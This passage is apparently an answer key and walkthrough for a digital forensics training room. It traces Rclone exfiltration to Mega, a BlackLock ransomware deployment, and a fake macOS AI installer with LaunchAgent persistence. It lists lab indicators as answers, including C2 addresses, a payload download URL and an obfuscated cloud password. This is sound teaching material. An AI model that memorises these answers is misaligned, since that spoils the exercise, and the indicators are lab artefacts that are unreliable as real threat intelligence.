Answer: 167.172.41.141

Question 4: Which well-known tool was used to exfiltrate the collected data?

Evidence: The filename rclone-v1.70.2-windows-amd64 confirms the use of Rclone, a command-line program to manage files on cloud storage.

Answer: Rclone

docs.title: ☁️ Phase 3: Exfiltration Configuration
docs.text:
We examined the configuration files left behind by the attacker to understand where the data was sent.

Rclone ConfigCredentials

Action: We found a config file named mega.conf inside the staging directory, utilized by Rclone to authenticate with the cloud provider.

Question: What is the obscured password to the attacker-controlled Mega?

Evidence: The config file contains an obfuscated password string for the mega remote type.

Answer: yWKgVA7Rv1iIoG-VWAr7NAFbwKHNiMZGNybJ4QybJHtiFg

docs.title: 📉 Phase 4: Impact Assessment
docs.text:
Finally, we analyzed the staged files to determine exactly what data was stolen from the CRM system.

Stolen DataVictim Identification

Action: Opening the Users_export file found in the staging folder revealed a list of employee details.

Question: What is Lucas's email address found in the exfiltrated data?

Evidence: The CSV export lists user details, specifically the entry for Lucas Rivera.

Answer: lucas.rivera@deceptitech.thm

docs.title: 🛡️ Case Verdict
docs.text:
Exfiltration Summary
  • Compromised User: matthew.collins
  • Tool: Rclone (to Mega.nz)
  • C2 Node: 167.172.41.141
Investigation Status We have confirmed data theft. We must now analyze the File System (Task 5) to find the ransomware payload itself. ← Previous: Task 3 Next: Task 5 (File System) →

docs.title: Task 5 File System
docs.text:
# 🌩️ Task 5: Shock and Silence Tool: MFTECmd Tactic: Impact Malware: BlackLock Analyzing the Master File Table (MFT) and file system artifacts to reconstruct the ransomware deployment. We trace the payload from download to execution and encryption.

🚨 Security Alert: Ransomware Detonation

Trigger: Widespread file modification and creation of ransom notes detected across the file system.

Initial Assessment: The attacker successfully downloaded a payload, renamed it to evade detection, and executed a crypto-ransomware strain that appended a unique extension to victim files.

Investigation Goal: Identify the delivery URL, the specific malware executable, and the threat actor responsible.

docs.title: 📥 Phase 1: Delivery & Download
docs.text:
We started by parsing the $MFT (Master File Table) using MFTECmd to find evidence of file downloads. The Zone.Identifier Alternate Data Stream (ADS) often contains the source URL of downloaded files.

MFT ParsingSource Identification

Action: Processing the MFT to extract metadata about recently created files.

Question: What is the full URL from which the ransomware was downloaded to the system?

Evidence: The Zone.Identifier contents for a suspicious zip file reveal it was downloaded from a file-sharing site.

Answer: https://store5.gofile.io/download/web/e23cb33f-0e4d-4a5f-8c55-ea2d78057d40/HiddenFile.zip

docs.title: 🎭 Phase 2: Payload Identification
docs.text:
After downloading the archive, the attacker extracted and renamed the executable to blend in. We used timeline analysis to find the original filename.

File TimelineFindings

Action: Analyzing the creation events in the download directory.

Question: What was the original file name of the ransomware executable downloaded to the host?

Evidence: The file timeline shows the creation of pb.exe immediately following the download.

Answer: pb.exe

docs.title: ⚙️ Phase 3: Execution & Encryption
docs.text:
The attacker did not run pb.exe directly for the encryption phase. Instead, they utilized another executable to perform the actual locking of files.

Execution ArtifactsProcess ID

Action: Correlating the timestamp of file encryption with running processes.

Question: Which executable file initiated the encryption process on the system?

Evidence: The timeline shows HpAgent.exe active exactly when the files began to be modified.

Answer: HpAgent.exe

docs.title: 🔒 Phase 4: Impact Analysis
docs.text:
We examined the file system to determine the scope of the damage and the specific indicators of compromise (IOCs).

Encrypted FilesExtension

Action: Listing files in the user's directory revealed the extension appended by the malware.

Question: What file extension was appended to the encrypted files?

Evidence: All user files have been renamed with the .EeUfy extension.

Answer: EeUfy

docs.title: 🏴‍☠️ Phase 5: Attribution
docs.text:
Finally, we analyzed the ransom note left behind to identify the threat actor.

Ransom NoteGroup Identity

Action: Opening the README.txt file found in the encrypted directories.

Question: Go beyond the obvious - which ransomware group targeted the organisation?

Evidence: The onion URL and the specific formatting of the note are characteristic of the BlackLock ransomware group.

Answer: BlackLock

docs.title: 🛡️ Case Verdict
docs.text:
Ransomware Profile
  • Group: BlackLock
  • Payload: HpAgent.exe (renamed/injected)
  • Extension: .EeUfy
  • Delivery: Gofile.io (Manual Download)
Investigation Status The ransomware attack is fully mapped. The final task is to investigate the MacOS laptop to see if any data was exfiltrated there as well. ← Previous: Task 4 Next: Task 6 (MacOS Forensics) →

docs.title: Task 6 MacOS Forensics
docs.text:
# 🍎 Task 6: MacOS Forensics Tool: Plistutil / Sqlite3 Tactic: Collection Technique: TCC Bypass Investigating the MacBook of the CEO. We analyze Safari artifacts, Installation receipts, and the TCC database to track data exfiltration on macOS.

🚨 Security Alert: Suspicious macOS Activity

Trigger: Endpoint detection flagged an unsigned installer requesting broad file system permissions.

Initial Assessment: The user downloaded a "fake" AI application which installed a persistent backdoor and exfiltrated documents to a remote server.

Investigation Goal: Identify the source of the malware, the installation timestamp, and the persistence mechanism used.

docs.title: 📥 Phase 1: Delivery Vector
docs.text:
We began by analyzing Safari's download history (Downloads.plist) to identify where the malicious file came from.

Safari ForensicsFindings

Action: Parsing ~/Library/Safari/Downloads.plist to view file origin metadata.

Question 1: What was the website from which the user downloaded the malicious application's installer?

Evidence: The DownloadEntryURL field points to a suspicious internal domain simulating a software vendor.

Answer: developai.thm

Question 2: What is the name of the malicious application's installer?

Evidence: The DownloadEntryPath shows the file saved to disk.

Answer: DevelopAIInstaller.pkg

docs.title: ⏱️ Phase 2: Installation Timeline
docs.text:
To determine exactly when the compromise occurred, we checked the macOS package receipts.

Package ReceiptsTimestamp

Action: Parsing /private/var/db/receipts/com.developai.app.plist using plistutil.

Question: When was the malicious application installed in the system?

Evidence: The InstallDate key provides the precise timestamp of execution.

Answer: 2025-07-04 10:09:03

docs.title: 🔓 Phase 3: Permissions (TCC)
docs.text:
MacOS uses TCC (Transparency, Consent, and Control) to manage permissions. We analyzed the TCC database to see what access the malware requested.

TCC DatabaseAccess Requests

Action: Querying TCC.db to view the access table for the malicious bundle identifier org.aiArt.DevelopAI.

Question: Which TCC permission did the application request first?

Evidence: The earliest timestamped request (at 10:10:33) corresponds to the Desktop Folder access.

Answer: kTCCServiceSystemPolicyDesktopFolder

docs.title: 📡 Phase 4: Exfiltration & C2
docs.text:
We examined the application's internal scripts to find the exfiltration logic.

Script AnalysisC2 Infrastructure

Action: Analyzing the bash script found within the application resources revealed the C2 server.

Question: What is the full C2 URL to which the application exfiltrated data?

Evidence: The variable LR defines the remote server receiving the stolen data via curl POST requests.

Answer: http://c7.macos-updatesupport.info:8080

docs.title: 🔄 Phase 5: Persistence
docs.text:
Finally, we identified how the malware ensured it would run every time the user logged in.

Launch AgentsMechanism

Action: Listing the contents of ~/Library/LaunchAgents/ revealed a suspicious property list and script.

Question: Which persistence mechanism did the application use?

Evidence: The presence of a .plist file in Library/LaunchAgents confirms the persistence method.

Answer: LaunchAgent

docs.title: 🏁 Operation Complete
docs.text:
🎉 Mission Accomplished Excellent work, Analyst. You have successfully reconstructed the entire attack chain:
  • Linux: SSH Brute Force & Web Shell
  • Windows: Lateral Movement & Ransomware
  • MacOS: Data Exfiltration & Spyware
← Previous: Task 5 Return to Dashboard 🏠
